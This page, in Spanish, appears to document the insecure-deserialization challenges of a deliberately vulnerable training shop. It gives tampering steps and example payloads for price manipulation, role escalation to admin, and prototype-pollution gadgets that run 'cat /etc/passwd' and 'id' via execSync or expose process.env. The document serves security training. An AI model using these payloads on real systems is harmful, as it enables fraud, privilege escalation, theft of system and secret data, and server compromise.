---
layout: default
title: Insecure Deserialization
nav_order: 5
parent: Vulnerabilidades
---

# Insecure Deserialization

## 5.1 Carrito de Compras Vulnerable
- **Ubicación**: `/api/v1/cart` y `/api/v1/cart/items`
- **Descripción**: Datos del carrito almacenados en cookie serializada insegura
- **Pasos**:
  1. Agregar items al carrito
  2. Interceptar y decodificar cookie (base64)
  3. Modificar datos serializados
  4. Recodificar y reemplazar cookie
- **Payload de ejemplo**:
  ```python
  # Cookie original (base64)
  b64decode('eyJpdGVtcyI6W3siaWQiOjEsInByaWNlIjoxMC45OSwicXR5IjoxfV19')

  # Datos deserializados
  {
    "items": [
      {
        "id": 1,
        "price": 10.99,
        "qty": 1
      }
    ]
  }

  # Modificar precio y cantidad
  {
    "items": [
      {
        "id": 1,
        "price": 0.01,
        "qty": 100
      }
    ]
  }

  # Recodificar en base64
  b64encode(json.dumps(modified_cart).encode())
  ```
- **Criterio de éxito**: Manipular precios y cantidades sin validación
- **Impacto**: Fraude en compras, pérdidas económicas

## 5.2 Manipulación de Sesión de Usuario
- **Ubicación**: `/api/v1/cart/checkout` y `/api/v1/user/session`
- **Descripción**: Datos de sesión serializados vulnerables a manipulación
- **Pasos**:
  1. Interceptar request de checkout
  2. Decodificar datos de sesión
  3. Modificar información de usuario/pago
  4. Reenviar request modificado
- **Payload de ejemplo**:
  ```python
  # Datos de sesión originales
  {
    "user": {
      "id": 2,
      "role": "user",
      "verified": false
    },
    "payment": {
      "verified": false,
      "limit": 1000
    }
  }

  # Datos modificados
  {
    "user": {
      "id": 2,
      "role": "admin",
      "verified": true
    },
    "payment": {
      "verified": true,
      "limit": 999999
    }
  }
  ```
- **Criterio de éxito**: Bypass de validaciones de checkout y límites
- **Impacto**: Manipulación de proceso de compra, escalación de privilegios

## 5.3 Lista de Deseos Insegura
- **Ubicación**: `/api/v1/wishlist`
- **Descripción**: Deserialización insegura en gestión de lista de deseos
- **Pasos**:
  1. Crear lista de deseos
  2. Interceptar request de guardado
  3. Modificar objeto serializado
  4. Inyectar código malicioso
- **Payload de ejemplo**:
  ```python
  # Objeto original
  {
    "items": [{"id": 1, "name": "Product"}],
    "shared": false
  }

  # Objeto malicioso con gadget
  {
    "items": [{"id": 1, "__proto__": {"polluted": true}}],
    "constructor": {
      "prototype": {
        "polluted": true
      }
    }
  }
  ```
- **Criterio de éxito**: Contaminación de prototipos
- **Impacto**: Ejecución de código, manipulación de objetos

## 5.4 Comparador de Productos
- **Ubicación**: `/api/v1/products/compare`
- **Descripción**: Deserialización insegura en comparación de productos
- **Pasos**:
  1. Seleccionar productos para comparar
  2. Interceptar request de comparación
  3. Modificar objeto serializado
  4. Inyectar comandos del sistema
- **Payload de ejemplo**:
  ```python
  # Request original
  {
    "products": [1, 2],
    "attributes": ["price", "specs"]
  }

  # Payload malicioso
  {
    "products": {"__proto__": {"shell": "true"}},
    "attributes": {
      "toString": {"__proto__": {
        "shell": "require('child_process').execSync('cat /etc/passwd')"
      }}
    }
  }
  ```
- **Criterio de éxito**: Ejecución de comandos del sistema
- **Impacto**: Compromiso del servidor

## 5.5 Chat de Soporte
- **Ubicación**: `/api/v1/support/chat/history`
- **Descripción**: Deserialización insegura en historial de chat
- **Pasos**:
  1. Acceder al historial de chat
  2. Interceptar respuesta serializada
  3. Modificar objeto del historial
  4. Inyectar payload malicioso
- **Payload de ejemplo**:
  ```python
  # Historial original
  {
    "messages": [
      {"text": "Hola", "time": "2024-01-20T10:00:00Z"}
    ]
  }

  # Payload malicioso
  {
    "messages": {
      "__proto__": {
        "toString": {
          "constructor": {
            "constructor": "return process.env"
          }
        }
      }
    }
  }
  ```
- **Criterio de éxito**: Acceso a variables de entorno
- **Impacto**: Fuga de información sensible

## 5.6 Gestión de Pedidos
- **Ubicación**: `/api/v1/orders/status`
- **Descripción**: Deserialización insegura en actualización de estado
- **Pasos**:
  1. Consultar estado de pedido
  2. Interceptar respuesta
  3. Modificar objeto de estado
  4. Inyectar código malicioso
- **Payload de ejemplo**:
  ```python
  # Estado original
  {
    "order_id": 1,
    "status": "pending",
    "updates": []
  }

  # Payload malicioso con RCE
  {
    "order_id": {"__proto__": {"shell": true}},
    "status": {
      "toString": {
        "constructor": {
          "constructor": "return require('child_process').execSync('id')"
        }
      }
    }
  }
  ```
- **Criterio de éxito**: Ejecución remota de código
- **Impacto**: Compromiso total del sistema
